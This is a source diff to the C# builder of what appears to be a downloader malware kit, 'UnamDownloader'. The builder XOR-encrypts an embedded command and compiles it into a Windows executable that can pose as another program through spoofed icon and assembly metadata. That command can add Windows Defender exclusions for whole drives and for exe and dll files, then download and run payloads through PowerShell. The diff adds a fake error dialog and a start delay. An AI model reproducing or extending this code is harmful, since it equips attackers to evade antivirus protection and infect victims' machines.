@@ -17,8 +17,7 @@ namespace UnamDownloader
     {
         private static Random random = new Random();
         public Vanity vanity = new Vanity();
-
-        public static int MAX_PATH = 255;
+        private string key = RandomString(32);
 
         public Builder()
         {
@@ -27,90 +26,126 @@ namespace UnamDownloader
 
         public void NativeCompiler(string savePath)
         {
-            string currentDirectory = Path.GetDirectoryName(savePath);
-            string compilerDirectory = Path.Combine(currentDirectory, "Compiler");
-            string filename = Path.GetFileName(savePath);
-
-            if (compilerDirectory.Length > MAX_PATH)
+            try
             {
-                MessageBox.Show(string.Format("Error: Path \"{0}\" is longer than the max allowed filepath length of {1} characters. Please choose another shorter filepath to save the build in.", compilerDirectory, MAX_PATH));
-                return;
+                btnBuild.Text = "Building...";
+                btnBuild.Enabled = false;
+                key = RandomString(32);
+
+                string currentDirectory = Path.GetDirectoryName(savePath);
+                string filename = Path.GetFileNameWithoutExtension(savePath);
+
+                Dictionary<string, string> paths = new Dictionary<string, string>(){
+                        { "current", currentDirectory },
+                        { "compiler", Path.Combine(currentDirectory, "Compiler") },
+                        { "compilerlog", Path.Combine(currentDirectory, "Compiler\\logs") },
+                        { "windres", Path.Combine(currentDirectory, "Compiler\\MinGW64\\bin\\windres.exe") },
+                        { "tcc", Path.Combine(currentDirectory, "Compiler\\tinycc\\tcc.exe") },
+                        { "windreslog", Path.Combine(currentDirectory, "Compiler\\logs\\windres.log") },
+                        { "tcclog", Path.Combine(currentDirectory, "Compiler\\logs\\tcc.log") },
+                        { "manifest", Path.Combine(currentDirectory, "administrator.manifest") },
+                        { "resource.rc", Path.Combine(currentDirectory, "resource.rc") },
+                        { "resource.o", Path.Combine(currentDirectory, "resource.o") },
+                        { "filename", Path.Combine(currentDirectory, filename) }
+                    };
+
+                char[] directoryFilter = CheckNonASCII(savePath);
+
+                if (BuildErrorTest(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter)))) return;
+
+                if (BuildErrorTest(checkDelay.Checked && !txtDelay.Text.All(char.IsDigit), "Error: Start Delay must be a number.")) return;
+
+                if (!Directory.Exists(paths["compiler"]))
+                {
+                    Directory.CreateDirectory(paths["compilerlog"]);
+                    using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.tinycc)))
+                    {
+                        archive.ExtractToDirectory(paths["compiler"]);
+                    }
+                    using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.MinGW64)))
+                    {
+                        archive.ExtractToDirectory(paths["compiler"]);
+                    }
+                }
+
+                StringBuilder sb = new StringBuilder(Properties.Resources.Program1);
+
+                bool buildResource = (checkAdmin.Checked || vanity.checkIcon.Checked || vanity.checkAssembly.Checked);
+
+                if (buildResource)
+                {
+                    StringBuilder resource = new StringBuilder(Properties.Resources.resource);
+                    string defs = "";
+                    if (vanity.checkIcon.Checked)
+                    {
+                        resource.Replace("#ICON", vanity.txtIconPath.Text);
+                        defs += " -DDefIcon";
+                    }
+                    if (checkAdmin.Checked)
+                    {
+                        System.IO.File.WriteAllBytes(paths["manifest"], Properties.Resources.administrator);
+                        defs += " -DDefAdmin";
+                    }
+                    if (vanity.checkAssembly.Checked)
+                    {
+                        resource.Replace("#TITLE", vanity.txtAssemblyTitle.Text);
+                        resource.Replace("#DESCRIPTION", vanity.txtAssemblyDescription.Text);
+                        resource.Replace("#COMPANY", vanity.txtAssemblyCompany.Text);
+                        resource.Replace("#PRODUCT", vanity.txtAssemblyProduct.Text);
+                        resource.Replace("#COPYRIGHT", vanity.txtAssemblyCopyright.Text);
+                        resource.Replace("#TRADEMARK", vanity.txtAssemblyTrademark.Text);
+                        resource.Replace("#VERSION", string.Join(",", new string[] { vanity.txtAssemblyVersion1.Text, vanity.txtAssemblyVersion2.Text, vanity.txtAssemblyVersion3.Text, vanity.txtAssemblyVersion4.Text }));
+                        defs += " -DDefAssembly";
+                    }
+
+                    System.IO.File.WriteAllText(paths["resource.rc"], resource.ToString());
+                    RunExternalProgram(
+                        "cmd",
+                        string.Format("cmd /c \"{0}\" --input resource.rc --output resource.o -O coff -F pe-i386 {1}", paths["windres"], defs),
+                        currentDirectory,
+                        paths["windreslog"]
+                    );
+                    System.IO.File.Delete(paths["resource.rc"]);
+                    System.IO.File.Delete(paths["manifest"]);
+
+                    if (BuildErrorTest(!System.IO.File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"]))) return;
+                }
+
+                string command = "cmd " + CreateCommand();
+                sb.Replace("#COMMAND", ToLiteral(Cipher(command, key)));
+                sb.Replace("#LENGTH", command.Length.ToString());
+                sb.Replace("#KEY", key);
+
+                if (checkDelay.Checked)
+                {
+                    sb.Replace("DefDelay", "TRUE");
+                    sb.Replace("#DELAY", txtDelay.Text);
+                }
+
+                if (checkError.Checked)
+                {
+                    sb.Replace("DefError", "TRUE");
+                    CipherReplace(sb, "#ERRORCOMMAND", "cmd /c powershell -Command \"Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('" + txtError.Text.Replace("'", "''") + "','Error','OK','Error')\"");
+                }
+
+                System.IO.File.WriteAllText(paths["filename"] + ".c", sb.ToString());
+                RunExternalProgram(
+                        paths["tcc"],
+                        string.Format("-Wall -Wl,-subsystem=windows \"{0}\" {1} -luser32 -m32", paths["filename"] + ".c", buildResource ? "resource.o" : ""),
+                        currentDirectory,
+                        paths["tcclog"]
+                    );
+                System.IO.File.Delete(paths["resource.o"]);
+                System.IO.File.Delete(paths["filename"] + ".c");
+
+                if (BuildErrorTest(!System.IO.File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["tcclog"]))) return;
             }
-
-            if (!Directory.Exists(compilerDirectory))
+            catch (Exception ex)
             {
-                using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.tinycc)))
-                {
-                    archive.ExtractToDirectory(compilerDirectory);
-                }
-                using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.MinGW64)))
-                {
-                    archive.ExtractToDirectory(compilerDirectory);
-                }
+                MessageBox.Show("Error: An error occured while building the file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
-
-            string compilerDirectoryShort = ShortPath(compilerDirectory);
-
-            StringBuilder sb = new StringBuilder(Properties.Resources.Program1);
-
-            bool buildResource = (checkAdmin.Checked || vanity.checkIcon.Checked || vanity.checkAssembly.Checked);
-
-            if (buildResource)
-            {
-                StringBuilder resource = new StringBuilder(Properties.Resources.resource);
-                string defs = "";
-                if (vanity.checkIcon.Checked)
-                {
-                    resource.Replace("#ICON", vanity.txtIconPath.Text);
-                    defs += " -DDefIcon";
-                }
-                if (checkAdmin.Checked)
-                {
-                    System.IO.File.WriteAllBytes(Path.Combine(currentDirectory, "administrator.manifest"), Properties.Resources.administrator);
-                    defs += " -DDefAdmin";
-                }
-                if (vanity.checkAssembly.Checked)
-                {
-                    resource.Replace("#TITLE", vanity.txtAssemblyTitle.Text);
-                    resource.Replace("#DESCRIPTION", vanity.txtAssemblyDescription.Text);
-                    resource.Replace("#COMPANY", vanity.txtAssemblyCompany.Text);
-                    resource.Replace("#PRODUCT", vanity.txtAssemblyProduct.Text);
-                    resource.Replace("#COPYRIGHT", vanity.txtAssemblyCopyright.Text);
-                    resource.Replace("#TRADEMARK", vanity.txtAssemblyTrademark.Text);
-                    resource.Replace("#VERSION", string.Join(",", new string[] { vanity.txtAssemblyVersion1.Text, vanity.txtAssemblyVersion2.Text, vanity.txtAssemblyVersion3.Text, vanity.txtAssemblyVersion4.Text }));
-                    defs += " -DDefAssembly";
-                }
-                System.IO.File.WriteAllText(Path.Combine(currentDirectory, "resource.rc"), resource.ToString());
-
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = "cmd",
-                    Arguments = string.Format("cmd /c \"{0}\" --input resource.rc --output resource.o -O coff -F pe-i386 {1}", compilerDirectoryShort + "\\MinGW64\\bin\\windres.exe", defs),
-                    WorkingDirectory = currentDirectory,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                }).WaitForExit();
-                System.IO.File.Delete(Path.Combine(currentDirectory, "resource.rc"));
-                System.IO.File.Delete(Path.Combine(currentDirectory, "administrator.manifest"));
-            }
-
-            string key = RandomString(32);
-            string command = "cmd " + CreateCommand();
-            sb.Replace("#COMMAND", ToLiteral(Cipher(command, key)));
-            sb.Replace("#LENGTH", command.Length.ToString());
-            sb.Replace("#KEY", key);
-
-            System.IO.File.WriteAllText(Path.Combine(currentDirectory, "program.c"), sb.ToString());
-            Process.Start(new ProcessStartInfo
-            {
-                FileName = "cmd",
-                Arguments = string.Format("cmd /c \"{0}\" -Wall -Wl,-subsystem=windows program.c {1} -luser32 -m32", compilerDirectoryShort + "\\tinycc\\tcc.exe", buildResource ? "resource.o" : ""),
-                WorkingDirectory = currentDirectory,
-                WindowStyle = ProcessWindowStyle.Hidden
-            }).WaitForExit();
-
-            System.IO.File.Delete(Path.Combine(currentDirectory, "resource.o"));
-            System.IO.File.Delete(Path.Combine(currentDirectory, "program.c"));
-            System.IO.File.Move(Path.Combine(currentDirectory, "program.exe"), Path.Combine(currentDirectory, filename));
+            btnBuild.Enabled = true;
+            btnBuild.Text = "Build";
         }
 
         public string CreateCommand()
@@ -129,7 +164,45 @@ namespace UnamDownloader
                     executes.Add(string.Format(@"powershell ""Start-Process -FilePath (Join-Path -Path {0} -ChildPath '{1}')""", droplocation, filevar.txtFilename.Text));
                 }
             }
-            return ("/c " + (checkWD.Checked ? "powershell -Command Add-MpPreference -ExclusionPath @($env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force & powershell -Command Add-MpPreference -ExclusionExtension @('exe','dll') -Force & " : "") + string.Join(" & ", downloads.ToArray()) + (executes.Count > 0 ? " & " + string.Join(" & ", executes.ToArray()) : "") + " & exit");
+            return ("/c " + (checkWD.Checked ? "powershell -Command \"Add-MpPreference -ExclusionPath @($env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force\" & powershell -Command \"Add-MpPreference -ExclusionExtension @('exe','dll') -Force\" & " : "") + string.Join(" & ", downloads.ToArray()) + (executes.Count > 0 ? " & " + string.Join(" & ", executes.ToArray()) : "") + " & exit");
+        }
+
+        public void RunExternalProgram(string filename, string arguments, string workingDirectory, string logpath)
+        {
+            using (Process process = new Process())
+            {
+                process.StartInfo.FileName = filename;
+                process.StartInfo.Arguments = arguments;
+                process.StartInfo.WorkingDirectory = workingDirectory;
+                process.StartInfo.CreateNoWindow = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardError = true;
+                process.Start();
+
+                using (StreamWriter writer = System.IO.File.AppendText(logpath))
+                {
+                    writer.Write(process.StandardError.ReadToEnd());
+                }
+                process.WaitForExit();
+            }
+        }
+
+        public bool BuildErrorTest(bool condition, string message)
+        {
+            if (condition)
+            {
+                MessageBox.Show(message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                btnBuild.Enabled = true;
+                btnBuild.Text = "Build";
+                return true;
+            }
+            return false;
+        }
+
+        public void CipherReplace(StringBuilder source, string id, string value)
+        {
+            source.Replace(id + "LENGTH", value.Length.ToString());
+            source.Replace(id, ToLiteral(Cipher(value, key)));
         }
 
         public static string RandomString(int length)
@@ -146,10 +219,10 @@ namespace UnamDownloader
 
         public string Cipher(string data, string key)
         {
-            var result = new StringBuilder();
+            var result = new char[data.Length];
             for (int c = 0; c < data.Length; c++)
-                result.Append((char)((uint)data[c] ^ key[c % key.Length]));
-            return result.ToString();
+                result[c] = (char)((uint)data[c] ^ key[c % key.Length]);
+            return string.Join("", result);
         }
 
         private static string ToLiteral(string input)
@@ -177,14 +250,9 @@ namespace UnamDownloader
             return literal.ToString();
         }
 
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
-        public static extern int GetShortPathName([MarshalAs(UnmanagedType.LPWStr)]string path, [MarshalAs(UnmanagedType.LPWStr)]StringBuilder shortPath, int shortPathLength);
-
-        private static string ShortPath(string path)
+        public static char[] CheckNonASCII(string text)
         {
-            var shortPath = new StringBuilder(MAX_PATH);
-            GetShortPathName(path, shortPath, MAX_PATH);
-            return shortPath.ToString();
+            return text.Where(c => c > 127).ToArray();
         }
 
         public string SaveDialog(string filter)
@@ -247,6 +315,17 @@ namespace UnamDownloader
         private void btnVanity_Click(object sender, EventArgs e)
         {
             vanity.Show();
+        }
+        
+        private void checkError_CheckedChanged(object sender)
+        {
+            txtError.Visible = checkError.Checked;
+        }
+
+        private void checkDelay_CheckedChanged(object sender)
+        {
+            txtDelay.Visible = checkDelay.Checked;
+            labelDelay.Visible = checkDelay.Checked;
         }
     }
 }
